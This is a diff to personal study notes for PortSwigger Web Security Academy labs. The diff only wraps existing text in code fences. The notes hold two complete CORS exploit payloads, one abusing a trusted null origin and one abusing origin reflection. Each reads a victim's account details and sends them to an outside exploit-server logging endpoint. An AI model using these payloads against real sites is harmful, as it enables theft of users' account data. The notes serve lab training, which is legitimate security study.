@@ -4,7 +4,8 @@
 ## CORS Vulnerabilities:
 - ==CORS vulnerability with trusted null origin== 
   try different endpoints adding Origin: null, and look for response to contain ACAO: null
-  \<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 	  var req = new XMLHttpRequest();
 	req.onload = reqListener;
 	req.open('get','https://lab_id.web-security-academy.net/accountDetails',true);
@@ -15,7 +16,10 @@
 	location='https://exploit_id.exploit-server.net/log?key='+this.responseText;
 	};
 	</script>"></iframe>
+```
+
 - ==CORS vulnerability with basic origin reflection== 
+```
   <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -27,7 +31,7 @@ function reqListener() {
         location='https://exploit_id.exploit-server.net/log?key='+this.responseText;
 };
 </script>
-
+```
 
 ## HTTP Request Smuggling Vulnerabilities
 - ==Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability==
